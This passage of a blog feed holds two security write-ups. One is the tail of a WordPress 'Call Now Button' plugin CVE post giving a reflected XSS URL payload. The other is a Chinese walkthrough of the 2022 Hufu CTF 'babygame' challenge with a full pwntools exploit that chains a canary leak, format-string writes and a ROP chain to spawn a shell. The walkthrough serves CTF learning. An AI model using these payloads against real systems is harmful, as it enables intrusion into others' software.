class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=call-now-button&amp;bid=xxxxx<span class="hljs-string">&quot; accesskey=X onclick=alert(1) test=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-call-now-button/4.png"></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022虎符babygame</title>
    <link href="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/"/>
    <url>/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/</url>
    
    <content type="html"><![CDATA[<p>比赛中没写出来，照着别人的wp复现了一下，记录下一些知识点。</p><p>题目还算是常规的那种，可以很明显看到漏洞是栈溢出和格式化字符串漏洞。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-04_224726.png"></p><p>首先是栈溢出为猜数游戏设置种子，并且泄露出canary的值。<br>然后通过猜数游戏（CDLL库可自行百度），进入13E7函数，</p><p>格式化字符串泄露出libcbase和elfbase，并且将ret addr改为sub_13E7函数，重新进入sub_13E7函数。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_173926.png"></p><p>此时将ret addr改为main函数，再用利用main函数中的栈溢出漏洞写入rop链，最后拿到shell。</p><p>rop链要加ret的原因是栈未对齐<br><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_174749.png"></p><p>可以看到，红框的语句的作用是检查rsp+0x50是否是0x10的倍数，显然不是，因此要加ret。</p><p>EXP：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> ctypes import cdll, CDLL<br><br><br><span class="hljs-attribute">context</span>.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-attribute">p</span> = process(&#x27;./babygame&#x27;)<br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><br><span class="hljs-attribute">base</span> = p.libs()[<span class="hljs-string">&quot;/hufu/babygame/37ae6078e4e24dcc8196e39efbe8c0bc/37ae6078e4e24dcc8196e39efbe8c0bc/babygame&quot;</span>]<br><br><span class="hljs-attribute">cmd</span> = <span class="hljs-string">&quot;b *%d\n&quot;</span> %(base+<span class="hljs-number">0</span>x1449)<br><span class="hljs-attribute">gdb</span>.attach(p, cmd)<br><br><br><span class="hljs-attribute">name</span> = b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x100+p64(<span class="hljs-number">0</span>x6161616161616161)+b<span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, name)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">9</span>)<br><br><span class="hljs-attribute">canary</span> = u64(b<span class="hljs-string">&quot;\x00&quot;</span>+p.recv(<span class="hljs-number">7</span>))<br><br><span class="hljs-attribute">rbp</span> = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-comment">#print(hex(canary))</span><br><br><span class="hljs-comment">#success(hex(canary))</span><br><span class="hljs-comment">#success(hex(rbp))</span><br><br><span class="hljs-attribute">libc</span> = CDLL(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>)<br><span class="hljs-attribute">libc</span>.srand(<span class="hljs-number">0</span>x6161616161616161)<br><br><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">100</span>):<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot; \n&quot;</span>, str((libc.rand()+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>))<br><br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-attribute">payload</span> = b<span class="hljs-string">&quot;%62c%9$hhn&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;q%79$p&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;ff%83$pl&quot;</span><br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;q&quot;</span>)<br><span class="hljs-attribute">leak</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br><span class="hljs-attribute">libc_base</span>= leak - <span class="hljs-number">0</span>x240b3<br><span class="hljs-comment">#success(hex(leak))</span><br><span class="hljs-comment">#success(hex(libc_base))</span><br><br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;ff&quot;</span>)<br><span class="hljs-attribute">elf_base</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x1465<br><span class="hljs-comment">#success(hex(elf_base))</span><br><br><span class="hljs-attribute">target</span> = (elf_base+<span class="hljs-number">0</span>x148e)&amp;<span class="hljs-number">0</span>xffff<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;%&#123;&#125;c%9$hn&quot;</span>.format(target).encode()<br><span class="hljs-attribute">payload</span> = payload.ljust(<span class="hljs-number">0</span>x10, b&#x27;a&#x27;)<br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">payload2</span> = b&#x27;q&#x27;*<span class="hljs-number">0</span>x108+p64(canary)+b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x18<br><br><span class="hljs-attribute">pop_rdi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000023b72<br><span class="hljs-attribute">bin_sh</span> = libc_base + <span class="hljs-number">0</span>x1b45bd<br><span class="hljs-attribute">system_addr</span> = libc_base + <span class="hljs-number">0</span>x522c0<br><span class="hljs-attribute">ret</span> = elf_base + <span class="hljs-number">0</span>x1565<br><br><span class="hljs-attribute">payload2</span> += p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system_addr)<br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, payload2)<br><br><span class="hljs-attribute">p</span>.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
